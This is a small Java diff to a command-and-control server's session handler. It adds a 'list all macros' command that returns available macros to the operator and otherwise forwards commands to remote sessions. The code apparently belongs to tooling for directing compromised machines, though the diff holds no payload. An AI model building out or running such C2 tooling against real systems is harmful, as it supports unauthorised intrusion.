@@ -6,6 +6,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 
+import c2.Commands;
 import c2.Constants;
 
 public class SessionHandler implements Runnable {
@@ -67,9 +68,13 @@ public class SessionHandler implements Runnable {
 							bw.write("Invalid session id." + System.lineSeparator());
 						}
 						bw.flush();
+					}else if(command.equalsIgnoreCase(Commands.SERVER_CMD_LIST_ALL_MACROS)) {
+						bw.write(cmm.getListOfMacros() + System.lineSeparator());
+						bw.flush();
 					}else if(!cmm.processCmd(command, sessionId, sessionName)) {
 						ioManager.sendCommand(sessionId, command);
 					}
+					
 				}
 				
 				String latestOutput = ioManager.pollIO(sessionId);
